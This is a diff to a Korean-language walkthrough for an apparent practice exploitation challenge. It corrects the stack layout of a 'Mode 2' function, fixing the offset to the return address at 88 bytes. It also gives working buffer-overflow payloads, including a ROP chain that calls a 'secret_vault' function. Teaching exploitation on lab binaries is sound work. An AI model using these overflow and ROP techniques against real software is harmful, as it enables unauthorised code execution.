@@ -34,11 +34,11 @@
 - Payload: `'A'*64 + p32(0xdeadbeef) + p32(0x1337c0de)`
 
 ### Mode 2 스택 구조
-`diag_buf`는 `-O0` 컴파일 시 `rbp-0x50`(80B)에 배치됩니다 (gdb `disas challenge_2_rop_diagnostic`의 `lea -0x50(%rbp),%rax` 로 확인).
+`diag_buf` **배열 자체는 64바이트**지만, `-O0` 빌드에서 하위 지역변수(`ssize_t n` 등)·정렬 패딩과 함께 `rbp-0x50`(80B) 위치에 배치됩니다 (gdb `disas challenge_2_rop_diagnostic`의 `lea -0x50(%rbp),%rax` 로 확인). 따라서 입력 시작점(diag_buf)부터 RET까지는 **80 + 8 = 88바이트**입니다.
 ```
-[ diag_buf (rbp-0x50 = 80 bytes) ] [ Saved RBP (8 bytes) ] [ Return Address (8 bytes) ] ...
-▲                                   ▲                       ▲
-0x00                                0x50 (80)               0x58 (88)  ★RET
+[ diag_buf[64] + 하위지역변수/패딩 = rbp-0x50 (80B) ] [ Saved RBP (8B) ] [ RET (8B) ] ...
+▲                                                     ▲                  ▲
+0x00                                                  0x50 (80)          0x58 (88)  ★RET
 ```
 - 가젯: 서버가 출력하는 `gadget_hub`(함수 시작) 기준 — `pop rdi; pop rsi; ret` = `gadget_hub+8`, 단독 `ret` = `gadget_hub+10`
 - Payload: `'A'*88 + p64(gadget_hub+8) + p64(key1) + p64(key2) + p64(gadget_hub+10) + p64(secret_vault)`
